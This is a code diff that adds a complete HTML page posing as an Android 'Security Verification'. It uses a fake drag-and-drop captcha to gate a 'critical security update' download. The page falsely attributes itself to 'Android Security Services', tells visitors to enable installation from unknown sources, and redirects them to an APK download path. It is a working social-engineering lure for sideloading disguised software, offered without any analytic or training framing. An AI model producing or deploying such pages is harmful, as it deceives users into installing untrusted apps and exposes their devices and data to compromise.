@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Security Verification</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Arial, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            background: white;
+            border-radius: 20px;
+            padding: 40px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            max-width: 500px;
+            width: 100%;
+            text-align: center;
+        }
+        
+        .header {
+            margin-bottom: 30px;
+        }
+        
+        .icon {
+            font-size: 64px;
+            color: #4CAF50;
+            margin-bottom: 20px;
+        }
+        
+        h1 {
+            color: #333;
+            margin-bottom: 10px;
+            font-size: 28px;
+        }
+        
+        .subtitle {
+            color: #666;
+            margin-bottom: 30px;
+            font-size: 16px;
+            line-height: 1.6;
+        }
+        
+        .captcha-box {
+            background: #f8f9fa;
+            border-radius: 10px;
+            padding: 25px;
+            margin-bottom: 30px;
+            border: 2px solid #e9ecef;
+        }
+        
+        .puzzle {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 15px;
+            margin: 20px 0;
+        }
+        
+        .drag-item {
+            background: #007bff;
+            color: white;
+            padding: 12px 20px;
+            border-radius: 8px;
+            cursor: move;
+            user-select: none;
+            font-weight: bold;
+        }
+        
+        .drop-zone {
+            background: white;
+            border: 2px dashed #007bff;
+            border-radius: 8px;
+            padding: 20px;
+            min-height: 60px;
+            min-width: 150px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .verify-btn {
+            background: linear-gradient(135deg, #4CAF50 0%, #45a049 100%);
+            color: white;
+            border: none;
+            padding: 18px 50px;
+            font-size: 18px;
+            border-radius: 50px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: all 0.3s;
+            width: 100%;
+        }
+        
+        .verify-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(76, 175, 80, 0.3);
+        }
+        
+        .warning {
+            background: #fff3cd;
+            border: 1px solid #ffeaa7;
+            color: #856404;
+            padding: 15px;
+            border-radius: 8px;
+            margin-top: 25px;
+            font-size: 14px;
+            text-align: left;
+        }
+        
+        .footer {
+            margin-top: 30px;
+            color: #999;
+            font-size: 12px;
+        }
+        
+        @media (max-width: 480px) {
+            .container {
+                padding: 25px;
+            }
+            
+            h1 {
+                font-size: 24px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="icon">🔐</div>
+            <h1>Security Verification Required</h1>
+            <p class="subtitle">Complete this verification to download the critical security update for your device.</p>
+        </div>
+        
+        <div class="captcha-box">
+            <h3>Prove You're Human</h3>
+            <p>Drag the correct piece to complete the puzzle:</p>
+            
+            <div class="puzzle">
+                <div class="drag-item" draggable="true" id="piece1">SEC</div>
+                <div class="drag-item" draggable="true" id="piece2">URI</div>
+                <div class="drag-item" draggable="true" id="piece3">TY</div>
+                <div class="drop-zone" id="dropZone">
+                    Drop here
+                </div>
+            </div>
+            
+            <p id="hint" style="color: #666; font-size: 14px; margin-top: 10px;">
+                Hint: Complete the word "SECURITY"
+            </p>
+        </div>
+        
+        <button class="verify-btn" onclick="verifyCaptcha()">
+            ✅ VERIFY & DOWNLOAD UPDATE
+        </button>
+        
+        <div class="warning">
+            <strong>⚠ Important:</strong>
+            <ul style="margin-top: 10px; margin-left: 20px;">
+                <li>This update patches critical security vulnerabilities</li>
+                <li>Your device will be protected against recent threats</li>
+                <li>Update size: ~15.2 MB</li>
+                <li>You may need to enable "Install from Unknown Sources"</li>
+            </ul>
+        </div>
+        
+        <div class="footer">
+            <p>Security verification provided by Android Security Services</p>
+            <p>© 2024 System Security Division. All rights reserved.</p>
+        </div>
+    </div>
+    
+    <script>
+        let correctPieces = ['SEC', 'URI', 'TY'];
+        let droppedPieces = [];
+        
+        // Drag and drop functionality
+        document.querySelectorAll('.drag-item').forEach(item => {
+            item.addEventListener('dragstart', e => {
+                e.dataTransfer.setData('text/plain', e.target.id);
+            });
+        });
+        
+        document.getElementById('dropZone').addEventListener('dragover', e => {
+            e.preventDefault();
+            e.currentTarget.style.borderColor = '#4CAF50';
+            e.currentTarget.style.background = '#f8fff8';
+        });
+        
+        document.getElementById('dropZone').addEventListener('dragleave', e => {
+            e.currentTarget.style.borderColor = '#007bff';
+            e.currentTarget.style.background = 'white';
+        });
+        
+        document.getElementById('dropZone').addEventListener('drop', e => {
+            e.preventDefault();
+            const id = e.dataTransfer.getData('text/plain');
+            const piece = document.getElementById(id);
+            const pieceText = piece.textContent;
+            
+            if (!droppedPieces.includes(pieceText)) {
+                droppedPieces.push(pieceText);
+                e.currentTarget.innerHTML += `<div class="dropped-piece">${pieceText}</div>`;
+                piece.style.opacity = '0.3';
+                piece.style.cursor = 'not-allowed';
+                piece.draggable = false;
+            }
+            
+            e.currentTarget.style.borderColor = '#007bff';
+            e.currentTarget.style.background = 'white';
+        });
+        
+        function verifyCaptcha() {
+            if (JSON.stringify(droppedPieces) === JSON.stringify(correctPieces)) {
+                // Captcha passed - redirect to download
+                window.location.href = '/download/android';
+            } else {
+                alert('Incorrect! Please try again. Hint: Drag SEC, then URI, then TY');
+                droppedPieces = [];
+                document.getElementById('dropZone').innerHTML = 'Drop here';
+                document.querySelectorAll('.drag-item').forEach(item => {
+                    item.style.opacity = '1';
+                    item.style.cursor = 'move';
+                    item.draggable = true;
+                });
+            }
+        }
+    </script>
+</body>
+</html>
